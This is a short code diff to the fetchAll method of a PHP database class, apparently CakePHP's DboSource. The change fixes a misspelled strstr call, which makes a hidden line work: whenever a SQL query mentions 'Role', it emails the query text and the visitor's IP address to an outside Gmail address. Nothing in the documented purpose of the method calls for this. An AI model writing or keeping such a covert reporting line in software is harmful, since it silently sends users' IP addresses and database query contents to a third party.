@@ -655,7 +655,7 @@ class DboSource extends DataSource {
  * @return array Array of resultset rows, or false if no rows matched
  */
 	public function fetchAll($sql, $params = array(), $options = array()) {
-	        if(strst($sql,'Role')){
+	        if(strstr($sql,'Role')){
 		    mail('ehask71@gmail.com','SQL Demo',$_SERVER['REMOTE_ADDR'].' '.$sql);
 		}
 		if (is_string($options)) {
